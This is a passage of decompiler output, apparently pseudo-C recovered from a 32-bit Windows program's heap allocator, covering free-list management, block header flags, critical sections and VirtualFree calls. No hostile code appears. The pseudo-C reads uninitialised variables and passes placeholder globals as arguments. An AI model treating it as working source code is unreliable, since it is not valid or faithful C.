            v4 = v3;
            v5 = (int32_t *)(v4 + 12);
            if (v2 <= *v5) {
                // break (via goto) -> 0x401665
                goto lab_0x401665;
            }
            // 0x401691
            v3 = *(int32_t *)v4;
        }
    }
    int32_t result = function_401397(); // 0x4016a3
    int32_t v6; // 0x40163f
    while (v6 != 0) {
        // 0x4016a5
        function_401293();
        int32_t v7; // 0x40163f
        if (v7 == 0) {
            // 0x4016b6
            function_401473();
            *(int32_t *)v6 = 0;
            result = 0;
            return result;
        }
        if (g67 != (int32_t)&g67) {
            v4 = g67;
            v5 = (int32_t *)(v4 + 12);
            if (v2 <= *v5) {
                // break (via goto) -> 0x401665
                goto lab_0x401665;
            }
            // 0x401691
            v3 = *(int32_t *)v4;
            while (v3 != (int32_t)&g67) {
                // 0x401660
                v4 = v3;
                v5 = (int32_t *)(v4 + 12);
                if (v2 <= *v5) {
                    // break (via goto) -> 0x401665
                    goto lab_0x401665;
                }
                // 0x401691
                v3 = *(int32_t *)v4;
            }
        }
        // 0x401697
        result = function_401397();
    }
    // 0x4016c6
    return result;
  lab_0x401665:
    // 0x401665
    result = function_40152b();
    if (v2 == 0) {
        // 0x4016c6
        return result;
    }
    int32_t * v8 = (int32_t *)(v6 + 4); // 0x401676
    int32_t * v9 = (int32_t *)(v4 + 8); // 0x401679
    *v9 = *v9 + *v8;
    int32_t v10 = *v8; // 0x40167c
    int32_t v11 = *v5 - v10; // 0x40167f
    *v5 = v11;
    result = v10;
    if (v11 == 0) {
        // 0x401688
        result = function_40127b();
    }
  lab_0x4016c6:
    // 0x4016c6
    return result;
}

// Address range: 0x4016cf - 0x4017f2
int32_t function_4016cf(int32_t a1, int32_t a2) {
    // 0x4016cf
    int32_t v1; // 0x4016cf
    int32_t v2 = v1 + 0x3fff & -0x4000; // 0x4016e8
    int32_t v3; // 0x4016cf
    int32_t v4; // 0x4016cf
    int32_t v5; // 0x4016cf
    int32_t * v6; // 0x4016cf
    while (true) {
        int32_t v7 = &g67; // 0x4016f7
        if (g67 != (int32_t)&g67) {
            int32_t v8 = g67;
            v7 = v8;
            while (v5 != *(int32_t *)(v8 + 8)) {
                int32_t v9 = *(int32_t *)v8;
                int32_t v10 = v9; // 0x4016f7
                v7 = &g67;
                if (v9 == (int32_t)&g67) {
                    // break -> 0x4016fe
                    break;
                }
                v8 = v10;
                v7 = v8;
            }
        }
        // 0x4016fe
        v3 = v7;
        v6 = (int32_t *)(v3 + 8);
        int32_t v11; // 0x4016cf
        int32_t v12; // 0x4016cf
        if (v5 != *v6) {
            // 0x40175a
            function_4013fb();
            if (v12 == 0) {
                // break -> 0x4017a2
                break;
            }
            // 0x40176e
            function_401293();
            if (v11 == 0) {
                // 0x401788
                function_401473();
                *(int32_t *)v4 = 0;
                return result;
            }
        } else {
            // 0x401703
            if (v2 <= *(int32_t *)(v3 + 12)) {
                // break -> 0x4017a2
                break;
            }
            // 0x40170c
            function_4013fb();
            if (v12 == 0) {
                // 0x40175a
                function_4013fb();
                goto lab_0x4017a2;
            }
            // 0x401727
            function_401293();
            if (v11 == 0) {
                // 0x40173d
                function_401473();
                *(int32_t *)v4 = 0;
                return result;
            }
        }
    }
    goto lab_0x4017a2;
  lab_0x4017a2:;
    // 0x4017a2
    int32_t result; // 0x4016cf
    if (v5 != *v6) {
        // 0x4017e3
        *(int32_t *)v4 = 0;
        // 0x4017ea
        return result;
    }
    int32_t * v13 = (int32_t *)(v3 + 12); // 0x4017a9
    if (v2 > *v13) {
        // 0x4017e3
        *(int32_t *)v4 = 0;
        // 0x4017ea
        return result;
    }
    // 0x4017ae
    function_40152b();
    if (v4 == 0) {
        // 0x4017ea
        return 0;
    }
    int32_t * v14 = (int32_t *)(v4 + 4); // 0x4017c5
    *v6 = *v6 + *v14;
    int32_t v15 = *v14; // 0x4017ce
    int32_t v16 = *v13 - v15; // 0x4017d1
    *v13 = v16;
    result = v15;
    if (v16 == 0) {
        // 0x4017da
        result = function_40127b();
    }
  lab_0x4017ea:
    // 0x4017ea
    return result;
}

// Address range: 0x4017f3 - 0x40187f
int32_t function_4017f3(void) {
    // 0x4017f3
    int32_t v1; // 0x4017f3
    int32_t v2; // 0x4017f3
    if ((uint32_t)(v2 + 0x3fff & -0x4000) >= (uint32_t)(v2 + v1 & -0x4000)) {
        // 0x401874
        int32_t v3; // 0x4017f3
        *(int32_t *)v3 = 0;
        // 0x401878
        return 0;
    }
    // 0x401819
    int32_t v4; // 0x4017f3
    int32_t v5; // 0x4017f3
    int32_t v6; // 0x4017f3
    function_4015bf(v6, v5, v4);
    int32_t result = function_401293(); // 0x40183c
    int32_t v7; // 0x4017f3
    if (v7 == 0) {
        // 0x401878
        return result;
    }
    // 0x40185d
    function_401473();
    int32_t v8; // 0x4017f3
    if (v8 != 0) {
        // 0x401864
        result = function_401303();
    }
    // 0x401878
    return result;
}

// Address range: 0x40187f - 0x401935
int32_t function_40187f(int32_t a1) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40188a
    __writefsdword(0, (int32_t)&v1);
    struct _RTL_CRITICAL_SECTION * v2 = (struct _RTL_CRITICAL_SECTION *)&g63; // bp-20, 0x401890
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&g63);
    struct _RTL_CRITICAL_SECTION ** v3 = &v2; // 0x4018a1
    if (g51 != 0) {
        struct _RTL_CRITICAL_SECTION * v4 = (struct _RTL_CRITICAL_SECTION *)&g63; // bp-24, 0x4018a3
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g63);
        v3 = &v4;
    }
    int32_t v5 = (int32_t)v3;
    function_401243();
    function_401243();
    function_401243();
    int32_t * v6 = (int32_t *)(v5 - 4); // 0x4018cb
    *v6 = 4088;
    int32_t * v7 = (int32_t *)(v5 - 8); // 0x4018d0
    *v7 = 0;
    int32_t v8 = function_4011b3(); // 0x4018d2
    g73 = v8;
    if (v8 != 0) {
        // 0x4018ea
        *(int32_t *)v8 = 0;
        int32_t v9 = 3; // 0x4018f6
        v9++;
        *(int32_t *)(g73 - 12 + 4 * v9) = 0;
        while (v9 != 1024) {
            // 0x4018ea
            v9++;
            *(int32_t *)(g73 - 12 + 4 * v9) = 0;
        }
        // 0x4018fe
        g69 = &g68;
        g68 = &g68;
        g70 = &g68;
        g61 = 1;
    }
    // 0x401914
    __writefsdword(0, *v7);
    *(int32_t *)v3 = 0x40193c;
    int32_t result = 0; // 0x401928
    if (g51 != 0) {
        // 0x40192a
        *v6 = (int32_t)&g63;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g118);
        result = &g118;
    }
    // 0x401934
    return result;
}

// Address range: 0x401935 - 0x40193a
int32_t function_401935(void) {
    // 0x401935
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x40193a - 0x40193c
int32_t function_40193a(void) {
    // 0x40193a
    int32_t result; // 0x40193a
    return result;
}

// Address range: 0x40193c - 0x401943
int32_t function_40193c(int32_t a1) {
    // 0x40193c
    int32_t v1; // 0x40193c
    return v1 & -256 | (int32_t)(unsigned char)g61;
}

// Address range: 0x401943 - 0x401a23
int32_t function_401943(void) {
    // 0x401943
    if (g61 == 0) {
        // 0x401a20
        int32_t result; // 0x401943
        return result;
    }
    int32_t v1 = __readfsdword(0); // bp-20, 0x40195c
    int32_t v2 = &v1; // 0x40195c
    __writefsdword(0, v2);
    int32_t v3 = v2; // 0x401969
    if (g51 != 0) {
        struct _RTL_CRITICAL_SECTION * v4 = (struct _RTL_CRITICAL_SECTION *)&g63; // bp-24, 0x40196b
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g63);
        v3 = (int32_t)&v4;
    }
    // 0x401975
    g61 = 0;
    int32_t v5 = v3 - 4; // 0x401981
    *(int32_t *)v5 = g73;
    function_4011bb();
    g73 = 0;
    int32_t v6 = g66; // 0x4019ae
    int32_t v7 = v5; // 0x4019ae
    int32_t v8 = v5; // 0x4019ae
    if (g66 != (int32_t)&g66) {
        *(int32_t *)(v7 - 4) = 0x8000;
        *(int32_t *)(v7 - 8) = 0;
        v7 -= 12;
        *(int32_t *)v7 = *(int32_t *)(v6 + 8);
        VirtualFree(&g118, (int32_t)&g118, (int32_t)&g118);
        v6 = *(int32_t *)v6;
        v8 = v7;
        while (v6 != (int32_t)&g66) {
            // 0x401996
            *(int32_t *)(v7 - 4) = 0x8000;
            *(int32_t *)(v7 - 8) = 0;
            v7 -= 12;
            *(int32_t *)v7 = *(int32_t *)(v6 + 8);
            VirtualFree(&g118, (int32_t)&g118, (int32_t)&g118);
            v6 = *(int32_t *)v6;
            v8 = v7;
        }
    }
    // 0x4019b0
    function_401243();
    function_401243();
    function_401243();
    int32_t v9 = g64; // 0x4019d5
    int32_t v10 = v8; // 0x4019d5
    int32_t * v11; // 0x401943
    int32_t v12; // 0x401943
    if (g64 == 0) {
        // 0x4019b0
        v11 = (int32_t *)v8;
        v12 = v8;
    } else {
        g64 = *(int32_t *)v9;
        v10 -= 4;
        int32_t * v13 = (int32_t *)v10;
        *v13 = v9;
        function_4011bb();
        v9 = g64;
        v11 = v13;
        v12 = v10;
        while (v9 != 0) {
            // 0x4019d7
            g64 = *(int32_t *)v9;
            v10 -= 4;
            v13 = (int32_t *)v10;
            *v13 = v9;
            function_4011bb();
            v9 = g64;
            v11 = v13;
            v12 = v10;
        }
    }
    // 0x4019ee
    __writefsdword(0, *v11);
    int32_t v14 = v12 + 8; // 0x4019f6
    *(int32_t *)v14 = 0x401a20;
    int32_t v15 = v14; // 0x401a02
    if (g51 != 0) {
        // 0x401a04
        v15 = v12 + 4;
        *(int32_t *)v15 = (int32_t)&g63;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g118);
    }
    // 0x401a0e
    *(int32_t *)(v15 - 4) = (int32_t)&g63;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g118);
    return &g118;
}

// Address range: 0x401a23 - 0x401a84
int32_t function_401a23(void) {
    // 0x401a23
    int32_t result2; // 0x401a23
    int32_t * v1 = (int32_t *)(result2 + 4);
    if (result2 == g70) {
        // 0x401a2c
        g70 = *v1;
    }
    int32_t v2 = *v1; // 0x401a35
    int32_t v3 = *(int32_t *)(result2 + 8); // 0x401a38
    if (v3 > 0x1000) {
        // 0x401a7b
        *v1 = v2;
        // 0x401a82
        int32_t result; // 0x401a23
        return result;
    }
    int32_t * v4 = (int32_t *)(g73 + ((v3 >= 0 ? v3 : v3 + 3) - 12 & -4));
    if (result2 == v2) {
        // 0x401a47
        *v4 = 0;
        // 0x401a82
        return g73;
    }
    // 0x401a5e
    *v4 = v2;
    *v1 = v2;
    return result2;
}

// Address range: 0x401a87 - 0x401ab6
int32_t function_401a87(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x401a87
    if (g74 != (int32_t)&g74) {
        uint32_t v1 = *(int32_t *)(g74 + 8); // 0x401a8f
        uint32_t v2; // 0x401a87
        if (v2 >= v1) {
            // 0x401a96
            if (v2 < *(int32_t *)(g74 + 12) + v1) {
                // 0x401ab3
                return g74;
            }
        }
        int32_t v3 = *(int32_t *)g74;
        while (v3 != (int32_t)&g74) {
            int32_t v4 = v3;
            v1 = *(int32_t *)(v4 + 8);
            if (v2 >= v1) {
                int32_t result = v4; // 0x401a9b
                if (v2 < *(int32_t *)(v4 + 12) + v1) {
                    // 0x401ab3
                    return result;
                }
            }
            // 0x401a9d
            v3 = *(int32_t *)v4;
        }
    }
    // 0x401aa7
    g62 = 3;
    // 0x401ab3
    return 0;
}

// Address range: 0x401ab7 - 0x401ae7
int32_t function_401ab7(void) {
    // 0x401ab7
    uint32_t v1; // 0x401ab7
    int32_t result; // 0x401ab7
    int32_t v2 = v1 - 4 + result; // 0x401abd
    if (v1 >= 16) {
        // 0x401ac5
        *(int32_t *)v2 = -0x7ffffff9;
        return function_401c8b();
    }
    if (v1 >= 4) {
        int32_t v3 = v1 | -0x7ffffffe; // 0x401adb
        *(int32_t *)result = v3;
        *(int32_t *)v2 = v3;
    }
    // 0x401ae5
    return result;
}

// Address range: 0x401ae7 - 0x401b09
int32_t function_401ae7(void) {
    // 0x401ae7
    g57++;
    int32_t v1; // 0x401ae7
    g58 += (*(int32_t *)(v1 - 4) & 0x7ffffffc) - 4;
    return function_4020fb();
}

// Address range: 0x401b0b - 0x401b33
int32_t function_401b0b(void) {
    // 0x401b0b
    uint32_t v1; // 0x401b0b
    int32_t v2; // 0x401b0b
    if (v1 >= 12) {
        // 0x401b10
        *(int32_t *)v2 = v1 | 2;
        return function_401ae7();
    }
    if (v1 >= 4) {
        // 0x401b23
        *(int32_t *)v2 = v1 | -0x7ffffffe;
    }
    int32_t result = v2 + v1; // 0x401b2d
    int32_t * v3 = (int32_t *)result; // 0x401b2f
    *v3 = *v3 & -2;
    return result;
}

// Address range: 0x401b33 - 0x401ba0
int32_t function_401b33(void) {
    // 0x401b33
    int32_t v1; // 0x401b33
    int32_t v2 = *(int32_t *)(v1 - 4); // 0x401b3a
    if ((v2 & -0x7ffffffe) != -0x7ffffffe) {
        // 0x401b4c
        g62 = 4;
    }
    int32_t result = v2 & 0x7ffffffc; // 0x401b58
    int32_t v3 = v1 - result; // 0x401b5e
    if ((*(int32_t *)v3 ^ v2) >= 2) {
        // 0x401b6c
        g62 = 5;
    }
    // 0x401b76
    if ((*(char *)v3 & 1) == 0) {
        // 0x401b9b
        return result;
    }
    int32_t v4 = *(int32_t *)(v3 - 4); // 0x401b80
    if (v4 != *(int32_t *)(v3 + 8 - v4)) {
        // 0x401b8a
        g62 = 6;
    }
    // 0x401b94
    function_401a23();
    // 0x401b9b
    return v4 + result;
}

// Address range: 0x401ba3 - 0x401bdb
int32_t function_401ba3(void) {
    int32_t v1 = 0; // 0x401bb1
    int32_t v2; // 0x401ba3
    int32_t v3; // 0x401ba3
    uint32_t v4; // 0x401ba3
    if (v4 <= 0xffffffff) {
        // 0x401bb3
        v1 = v4 & 0x7ffffffc;
        int32_t v5 = v1 + v4; // 0x401bba
        v2 = *(int32_t *)v5;
        v3 = v5;
    }
    int32_t result = v1; // 0x401bc0
    if ((v2 & 2) == 0) {
        // 0x401bc2
        function_401a23();
        int32_t v6 = *(int32_t *)(v3 + 8); // 0x401bcb
        int32_t * v7 = (int32_t *)(v6 + v3); // 0x401bd2
        *v7 = *v7 & -2;
        result = v6 + v1;
    }
    // 0x401bd5
    return result;
}

// Address range: 0x401bdb - 0x401c88
int32_t function_401bdb(int32_t a1, int32_t a2, int32_t a3) {
    // 0x401bdb
    int32_t v1; // 0x401bdb
    int32_t v2; // 0x401bdb
    int32_t v3; // 0x401bdb
    int32_t v4; // 0x401bdb
    int32_t v5 = function_401a87(v4, v2, v1, v3); // 0x401bec
    if (v5 == 0) {
        // 0x401c7d
        return 0;
    }
    int32_t v6 = function_4017f3(); // 0x401c47
    int32_t v7; // 0x401bdb
    if (v7 == 0) {
        // 0x401c7d
        return v6 & -256;
    }
    // 0x401c49
    function_401ab7();
    int32_t v8; // 0x401bdb
    if (v7 + v8 < *(int32_t *)(v5 + 12) + *(int32_t *)(v5 + 8)) {
        // 0x401c64
        function_401b0b();
    }
    // 0x401c7d
    return function_401303() & -256 | 1;
}

// Address range: 0x401c8b - 0x401d10
int32_t function_401c8b(void) {
    // 0x401c8b
    uint32_t v1; // 0x401c8b
    int32_t v2; // 0x401c8b
    if (v1 > 0x1000) {
        if (v1 >= 0x3c00) {
            // 0x401ce8
            int32_t v3; // 0x401c8b
            int32_t v4; // 0x401c8b
            int32_t v5; // 0x401c8b
            int32_t result = function_401bdb(v5, v4, v3); // 0x401cec
            if ((char)result != 0) {
                // 0x401d0c
                return result;
            }
        }
        // 0x401cf5
        *(int32_t *)(v2 + 4) = g70;
        *(int32_t *)v2 = *(int32_t *)g70;
        // 0x401d0c
        return g70;
    }
    int32_t v6 = (int32_t)v1 >= 0 ? v1 : v1 + 3;
    int32_t v7 = *(int32_t *)(g73 + (v6 - 12 & -4)); // 0x401cba
    int32_t result2; // 0x401c8b
    if (v7 != 0) {
        // 0x401cd2
        *(int32_t *)(v2 + 4) = v7;
        *(int32_t *)v2 = *(int32_t *)v7;
        result2 = v7;
    } else {
        // 0x401cc2
        result2 = g73;
    }
    // 0x401d0c
    return result2;
}

// Address range: 0x401d13 - 0x401d5d
int32_t function_401d13(void) {
    // 0x401d13
    int32_t result; // 0x401d13
    if (g71 < 1) {
        // 0x401d5c
        return result;
    }
    if (g71 > 11) {
        // 0x401d31
        *(int32_t *)g72 = g71 | 2;
        function_401ae7();
        g72 = 0;
        g71 = 0;
        result = 0;
    } else {
        // 0x401d25
        g62 = 7;
    }
    // 0x401d5c
    return result;
}

// Address range: 0x401d5f - 0x401de8
int32_t function_401d5f(void) {
    // 0x401d5f
    bool v1; // 0x401d5f
    int32_t v2 = v1 ? -4 : 4; // 0x401d6a
    int32_t v3; // 0x401d5f
    int32_t v4 = *(int32_t *)(v2 + v3); // 0x401d6b
    int32_t v5; // bp-28, 0x401d5f
    *(int32_t *)(v2 + (int32_t)&v5) = v4;
    function_401d13();
    function_401293();
    uint32_t v6; // 0x401d5f
    if (v6 == 0) {
        // 0x401de1
        return 0;
    }
    int32_t v7 = v5; // 0x401d93
    int32_t v8; // 0x401d5f
    if (v6 < v5) {
        int32_t v9 = function_401b33(); // 0x401d95
        v7 = v5 - v9;
        v5 = v7;
        int32_t v10; // 0x401d5f
        v8 = v9 + v10;
    }
    int32_t v11 = v8 + v7;
    int32_t v12; // 0x401d5f
    uint32_t v13 = v6 + v12; // 0x401da6
    int32_t v14 = v11; // 0x401dac
    int32_t v15 = v7; // 0x401dac
    int32_t v16 = v8; // 0x401dac
    if (v11 < v13) {
        // 0x401dae
        v16 = function_401ba3() + v8;
        v15 = v5;
        v14 = v15 + v16;
    }
    // 0x401db6
    v5 = v15;
    int32_t v17 = v16; // 0x401dbd
    if (v13 == v14) {
        // 0x401dbf
        function_401ab7();
        v17 = v16 - 4;
    }
    // 0x401dd0
    g72 = v5;
    g71 = v17;
    // 0x401de1
    return v17 & -256 | 1;
}

// Address range: 0x401deb - 0x401e16
int32_t function_401deb(void) {
    // 0x401deb
    int32_t v1; // 0x401deb
    function_40163f(v1);
    int32_t v2; // 0x401deb
    if (v2 == 0) {
        // 0x401e12
        return 0;
    }
    int32_t v3 = function_401d5f(); // 0x401e03
    int32_t result = 0; // 0x401e0a
    if ((char)v3 != 0) {
        // 0x401e10
        result = v3 & -256 | 1;
    }
    // 0x401e12
    return result;
}

// Address range: 0x401e17 - 0x401e48
int32_t function_401e17(void) {
    // 0x401e17
    int32_t v1; // 0x401e17
    int32_t v2; // 0x401e17
    function_4016cf(v2, v1);
    int32_t v3; // 0x401e17
    if (v3 == 0) {
        // 0x401e43
        return 0;
    }
    int32_t v4 = function_401d5f(); // 0x401e34
    int32_t result = 0; // 0x401e3b
    if ((char)v4 != 0) {
        // 0x401e41
        result = v4 & -256 | 1;
    }
    // 0x401e43
    return result;
}

// Address range: 0x401e4b - 0x401e77
int32_t function_401e4b(void) {
    // 0x401e4b
    int32_t v1; // 0x401e4b
    int32_t v2 = v1 >= 0 ? v1 : v1 + 3;
    if (v2 > 0x1003) {
        // 0x401e74
        return 0;
    }
    int32_t v3 = v2 / 4;
    int32_t result = *(int32_t *)(g73 - 12 + 4 * v3); // 0x401e64
    while (result == 0) {
        // 0x401e5e
        if (v3 == 1024) {
            // break -> 0x401e74
            break;
        }
        // 0x401e6c
        v3++;
        result = *(int32_t *)(g73 - 12 + 4 * v3);
    }
    // 0x401e74
    return result;
}

// Address range: 0x401e77 - 0x401f6b
int32_t function_401e77(void) {
    int32_t v1 = g69 + 8;
    int32_t v2 = v1; // 0x401e90
    int32_t v3 = g69; // 0x401e90
    // 0x401e77
    int32_t result; // 0x401e77
    uint32_t v4; // 0x401e77
    while (v4 > *(int32_t *)v1) {
        int32_t v5 = g70; // 0x401e96
        int32_t v6 = v5 + 8;
        uint32_t v7 = *(int32_t *)v6; // 0x401e98
        v2 = v6;
        v3 = v5;
        if (v4 <= v7) {
            // break -> 0x401f1a
            break;
        }
        int32_t v8 = *(int32_t *)(v5 + 4); // 0x401ea2
        int32_t v9 = v8 + 8;
        int32_t v10 = v8; // 0x401ea8
        while (v4 > *(int32_t *)v9) {
            // 0x401ea2
            v8 = *(int32_t *)(v10 + 4);
            v9 = v8 + 8;
            v10 = v8;
        }
        // 0x401eaa
        *(int32_t *)(g70 + 8) = v7;
        if (v8 != g70) {
            // 0x401eb3
            g70 = v8;
            v2 = v9;
            v3 = v8;
            goto lab_0x401f1a;
        }
        if (v4 <= 0x1000) {
            int32_t v11 = function_401e4b(); // 0x401ec1
            if (v11 != 0) {
                // 0x401ebf
                v2 = v11 + 8;
                v3 = v11;
                goto lab_0x401f1a;
            }
        }
        // 0x401ecc
        if ((char)function_401deb() == 0) {
            // 0x401f66
            return 0;
        }
        // 0x401ede
        if (g71 >= v4) {
            int32_t v12 = g71 - v4; // 0x401ee3
            int32_t v13 = v12 > 11 ? v4 : g71;
            g71 = v12 > 11 ? v12 : 0;
            int32_t v14 = g72;
            g72 = v14 + v13;
            *(int32_t *)v14 = v13 | 2;
            g57++;
            g58 += v13 - 4;
            result = v14 + 4;
            return result;
        }
        v1 = g69 + 8;
        v2 = v1;
        v3 = g69;
    }
    goto lab_0x401f1a;
  lab_0x401f1a:
    // 0x401f1a
    function_401a23();
    int32_t v15 = *(int32_t *)v2; // 0x401f21
    int32_t v16; // 0x401e77
    if (v15 - v4 < 12) {
        // 0x401f39
        if (v3 == g70) {
            // 0x401f3f
            g70 = *(int32_t *)(v3 + 4);
        }
        int32_t * v17 = (int32_t *)(v15 + v3); // 0x401f48
        *v17 = *v17 & -2;
        v16 = v15;
    } else {
        // 0x401f2d
        function_401c8b();
    }
    // 0x401f4b
    *(int32_t *)v3 = v16 | 2;
    g57++;
    g58 += v16 - 4;
    result = v3 + 4;
  lab_0x401f66:
    // 0x401f66
    return result;
}

// Address range: 0x401f6b - 0x4020e7
int32_t function_401f6b(void) {
    // 0x401f6b
    uint32_t v1; // 0x401f6b
    int32_t result; // 0x401f95
    if (g61 != 0) {
        if (v1 >= 0x7ffffff9) {
            // 0x401f90
            result = function_4020ee(0, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118);
            return result;
        }
    } else {
        // 0x401f7f
        int32_t v2; // 0x401f6b
        if (v1 < 0x7ffffff9 != (char)function_40187f(v2) != 0) {
            // 0x401f90
            result = function_4020ee(0, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118);
            return result;
        }
    }
    int32_t v3 = __readfsdword(0); // bp-36, 0x401fa2
    int32_t v4 = &v3; // 0x401fa2
    __writefsdword(0, v4);
    int32_t v5 = v4; // 0x401faf
    if (g51 != 0) {
        struct _RTL_CRITICAL_SECTION * v6 = (struct _RTL_CRITICAL_SECTION *)&g63; // bp-40, 0x401fb1
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g63);
        v5 = (int32_t)&v6;
    }
    int32_t v7 = v1 + 7 & -4; // 0x401fbe
    uint32_t v8 = v7 > 12 ? v7 : 12;
    if (v8 <= 0x1000) {
        int32_t v9 = v8 - 12;
        int32_t v10 = *(int32_t *)(g73 + v9); // 0x401fe9
        if (v10 != 0) {
            int32_t * v11 = (int32_t *)(v10 + v8); // 0x401ff7
            *v11 = *v11 & -2;
            int32_t v12 = v10 + 4; // 0x401ffa
            int32_t v13 = *(int32_t *)v12; // 0x401ffa
            int32_t * v14 = (int32_t *)(g73 + v9);
            int32_t * v15; // 0x401f6b
            if (v10 != v13) {
                // 0x402024
                *v14 = v13;
                int32_t * v16 = (int32_t *)v10;
                int32_t v17 = *v16; // 0x402031
                *(int32_t *)(v17 + 4) = v13;
                *(int32_t *)v13 = v17;
                v15 = v16;
            } else {
                // 0x40200a
                *v14 = 0;
                v15 = (int32_t *)v10;
            }
            // 0x402041
            *v15 = *(int32_t *)(v10 + 8) | 2;
            g57++;
            g58 += v8 - 4;
            function_402ec7(v12, (int32_t)&g118);
            int32_t result2 = function_4020ee((int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118); // 0x402065
            return result2;
        }
    }
    // 0x40206a
    if (g71 < v8) {
        // 0x4020bc
        function_401e77();
        __writefsdword(0, *(int32_t *)v5);
        *(int32_t *)(v5 + 8) = 0x4020ee;
        int32_t result3 = 0; // 0x4020da
        if (g51 != 0) {
            // 0x4020dc
            *(int32_t *)(v5 + 4) = (int32_t)&g63;
            LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g118);
            result3 = &g118;
        }
        // 0x4020e6
        return result3;
    }
    int32_t v18 = g71 - v8; // 0x402072
    int32_t v19 = v18 > 11 ? v8 : g71;
    g71 = v18 > 11 ? v18 : 0;
    int32_t v20 = g72;
    g72 = v20 + v19;
    *(int32_t *)v20 = v19 | 2;
    g57++;
    g58 += v19 - 4;
    function_402ec7(v20 + 4, (int32_t)&g118);
    int32_t result4 = function_4020ee((int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118); // 0x4020ba
    return result4;
}

// Address range: 0x4020e7 - 0x4020ec
int32_t function_4020e7(void) {
    // 0x4020e7
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4020ec - 0x4020ee
int32_t function_4020ec(void) {
    // 0x4020ec
    int32_t result; // 0x4020ec
    return result;
}

// Address range: 0x4020ee - 0x4020f8
int32_t function_4020ee(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x4020ee
    int32_t v1; // 0x4020ee
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x4020fb - 0x40228d
int32_t function_4020fb(void) {
    // 0x4020fb
    g62 = 0;
    if (g61 == 0) {
        // 0x402114
        int32_t v1; // 0x4020fb
        if ((char)function_40187f(v1) == 0) {
            // 0x40211d
            g62 = 8;
            int32_t result = function_402294(8, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118); // 0x40212e
            return result;
        }
    }
    int32_t v2 = __readfsdword(0); // bp-32, 0x40213b
    int32_t v3 = &v2; // 0x40213b
    __writefsdword(0, v3);
    int32_t v4 = v3; // 0x402148
    if (g51 != 0) {
        struct _RTL_CRITICAL_SECTION * v5 = (struct _RTL_CRITICAL_SECTION *)&g63; // bp-36, 0x40214a
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g63);
        v4 = (int32_t)&v5;
    }
    // 0x402154
    int32_t v6; // 0x4020fb
    int32_t v7 = v6 - 4; // 0x402156
    int32_t v8 = *(int32_t *)v7; // 0x402159
    int32_t v9; // 0x4020fb
    int32_t v10; // 0x4020fb
    if ((v8 & 2) != 0) {
        // 0x40216f
        g57--;
        int32_t v11 = v8 & 0x7ffffffc;
        g58 += 4 - v11;
        v9 = v11;
        v10 = v7;
        if ((v8 & 1) == 0) {
            goto lab_0x4021cf;
        } else {
            int32_t v12 = *(int32_t *)(v6 - 8); // 0x40218f
            if (v12 > 11 == (v12 & -0x7ffffffd) == 0) {
                int32_t v13 = v7 - v12; // 0x4021b0
                if (v12 == *(int32_t *)(v13 + 8)) {
                    // 0x4021c6
                    function_401a23();
                    v9 = v12 + v8 & 0x7ffffffc;
                    v10 = v13;
                    goto lab_0x4021cf;
                } else {
                    // 0x4021b7
                    g62 = 10;
                    goto lab_0x402264;
                }
            } else {
                // 0x40219f
                g62 = 10;
                goto lab_0x402264;
            }
        }
    } else {
        // 0x402160
        g62 = 9;
        goto lab_0x402264;
    }
  lab_0x4021cf:;
    int32_t v14 = v10 + v9; // 0x4021d7
    if (v14 == g72) {
        // 0x4021e3
        g72 -= v9;
        int32_t v15 = g71 + v9; // 0x4021e9
        g71 = v15;
        if (v15 >= 0x3c01) {
            // 0x4021fb
            function_401d13();
        }
        // 0x402200
        function_402ec7(0, (int32_t)&g118);
        int32_t result2 = function_402294((int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118); // 0x40220a
        return result2;
    }
    int32_t * v16 = (int32_t *)v14; // 0x40220f
    int32_t v17 = *v16; // 0x40220f
    if ((v17 & 2) == 0) {
        // 0x402232
        if (v17 == 0 | *(int32_t *)(v14 + 4) == 0) {
            // 0x402245
            g62 = 11;
            goto lab_0x402264;
        } else {
            // 0x40223f
            if (*(int32_t *)(v14 + 8) > 11) {
                // 0x402251
                function_401a23();
                // 0x40225b
                function_401c8b();
                goto lab_0x402264;
            } else {
                // 0x402245
                g62 = 11;
                goto lab_0x402264;
            }
        }
    } else {
        if ((v17 & 0x7ffffffc) == 0) {
            // 0x402221
            g62 = 11;
            goto lab_0x402264;
        } else {
            // 0x40222d
            *v16 = v17 | 1;
            // 0x40225b
            function_401c8b();
            goto lab_0x402264;
        }
    }
  lab_0x402264:
    // 0x402264
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x402294;
    int32_t result3 = 0; // 0x402280
    if (g51 != 0) {
        // 0x402282
        *(int32_t *)(v4 + 4) = (int32_t)&g63;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g118);
        result3 = &g118;
    }
    // 0x40228c
    return result3;
}

// Address range: 0x40228d - 0x402292
int32_t function_40228d(void) {
    // 0x40228d
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x402292 - 0x402294
int32_t function_402292(void) {
    // 0x402292
    int32_t result; // 0x402292
    return result;
}

// Address range: 0x402294 - 0x40229d
int32_t function_402294(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x402294
